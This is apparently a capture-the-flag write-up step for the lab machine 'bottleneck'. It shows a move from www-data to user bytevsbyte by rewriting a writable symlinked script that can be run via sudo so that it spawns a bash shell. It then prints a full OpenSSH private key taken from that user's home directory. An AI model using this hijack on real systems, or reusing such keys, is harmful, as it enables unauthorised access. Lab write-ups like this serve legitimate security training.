# 6 www-data > bytevsbyte

```
www-data@bottleneck:/tmp$ sudo -u bytevsbyte "/var/www/html/web_utils/clear_logs"

# tried making rm using msfvenom - didnt work

www-data@bottleneck:/tmp$ cat "/var/www/html/web_utils/clear_logs"
#!/bin/bash
rm -f /var/log/soc/intrusion_*
www-data@bottleneck:/tmp$ ls -la /opt
total 16
drwxr-xr-x  2 root       root       4096 Sep 27  2019 .
drwxr-xr-x 20 root       root       4096 Feb 20  2020 ..
-rwxr--r--  1 bytevsbyte bytevsbyte   43 Sep 27  2019 clear_logs.sh
-rw-r--r--  1 root       root        359 Sep 27  2019 ids_strong_bvb.py
# cannot write / modify here

www-data@bottleneck:/tmp$ ls -la /var/www/html/web_utils/
total 8
drwxrwxr-x 2 www-data www-data 4096 Mar  2  2020 .
drwxr-xr-x 7 root     root     4096 Sep 26  2019 ..
lrwxrwxrwx 1 root     root       18 Mar  2  2020 clear_logs -> /opt/clear_logs.sh
# can write and modify here - we can change the symlink

# method 1 - change symlink 
echo -e "/bin/bash\n/bin/bash" > kashz.sh
ln -fs kashz.sh /var/www/html/web_utils/clear_logs

# delete symlink & change clear_logs directly as we have full control over it
rm clear_logs
echo -e "/bin/bash\n/bin/bash" > clear_logs
chmod 777 clear_logs

sudo -u bytevsbyte "/var/www/html/web_utils/clear_logs"

bytevsbyte@bottleneck:~/html/web_utils$ whoami;id;hostname
bytevsbyte
uid=1000(bytevsbyte) gid=1000(bytevsbyte) groups=1000(bytevsbyte),4(adm),24(cdrom),30(dip),46(plugdev),1001(tester)
bottleneck
```

#### id_rsa found in /home/bytevsbyte/.ssh/

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAzoX5U05QeNLJYemVJ66WEk8xrUFPpAThbnf8236hv4zpIsGciMeF
r6Mam8QogTn3ZayuPNNRxAXUbGH3a3DCMwMvFkuGRBNSa5tdy0ELth26/BYA1dr8tGX5+v
kUHpMT6TBd3diHsb0j9tYaaoJX6gFNzfPfZZNvd2jek9B/6NyBi5OaXehLMXaJEnFVuaRo
VDEAmNKb+yzpb/YAkfrHjjhQRdxywSlbgAsqJJrVwK5fCf0rwKjJRXoRp3m8v3Fa8Jfx5Y
IR/EU39XIqcBWWwGeDLikr/nYixN+9F/PfUB26SLlEg2Gq0M2IniS2RaLNbhReEO1OQzMF
anJjSpYUBQAAA9DcA5rM3AOazAAAAAdzc2gtcnNhAAABAQDOhflTTlB40slh6ZUnrpYSTz
GtQU+kBOFud/zbfqG/jOkiwZyIx4WvoxqbxCiBOfdlrK4801HEBdRsYfdrcMIzAy8WS4ZE
E1Jrm13LQQu2Hbr8FgDV2vy0Zfn6+RQekxPpMF3d2IexvSP21hpqglfqAU3N899lk293aN
6T0H/o3IGLk5pd6EsxdokScVW5pGhUMQCY0pv7LOlv9gCR+seOOFBF3HLBKVuACyokmtXA
rl8J/SvAqMlFehGneby/cVrwl/HlghH8RTf1cipwFZbAZ4MuKSv+diLE370X899QHbpIuU
SDYarQzYieJLZFos1uFF4Q7U5DMwVqcmNKlhQFAAAAAwEAAQAAAQAwK4OJ8LxIUjHyin7l
sI0EXEBj/tXKlfDWyVnLAHBNs1o1Zx9Rr+f4nXx5VHl2GsUfi/Vf7pIlvI5dcUQ6ZSSGrX
lwI9F/U1poCucHn3ZR1gFlBuTO/LLwiNCTv0D4GKoOO9/I/NY5mLoouquSqDBFPmSdYwJ6
OLdJDMbNh1YuQ8Tq7TahEUUFUG3/rTckzVbluTS9bujEAT4ePyRXJH9SsDtOvj3US/z4IR
vcI9YYIN/a1fvT1Ve18PbuUlBtJt5qcRRLifPni7smnWcK27mf02KjSo/nyMyztExsHDj8
05CVh3QZzjGFLLhNXBaowgg8pK0GhbLu7LujvQGiGwHBAAAAgQC7iLFhOVhE9+5SLuMQIp
Dc4S25YJPhENGzILpo/uAMyDG8jGNGezaHgTh3UknZvZRJc3EFOnHJv9KAL3jncYrGfU97
rBDuJAVtTe5JbydQL1ToXqLeCc0KjHPx2ZiOvG4+kBldseMzuuEhKuKJjQO82D9HFRLCqg
yEgHfj/EkoMQAAAIEA84haO5pgnlHYOxMRiWCfhh+ggo6ia6W5dm2poM3xVMsP0skg7Kif
053r6x/wVL4JJWL/Y+G8+THGPnT1YZ2/EItDoi/IDX1tJTz1ZHuEPqdmWz/klx7EkKk7Ii
hVlBaH6qpOFyox6coJNqCKXoRuqiI32XywRzdO1HaUdZpY/m0AAACBANkYl25EYsM8+jEw
uZ4GNksXym4vpCTllBrCTWcQFt8yxRyJiPiBNhMEr/GGKWDBaj3G6hu2CbswMfOQrupMAx
ZKI92d1zv4mnb26YlKxS+TnJjdEKULwsdjvYXtkHnD15Ir1SkbYkZ62wFEXuOub1+TUuTK
DV+puVeQaQrgj4z5AAAAFWJ5dGV2c2J5dGVAYm90dGxlbmVjawECAwQF
-----END OPENSSH PRIVATE KEY-----
```
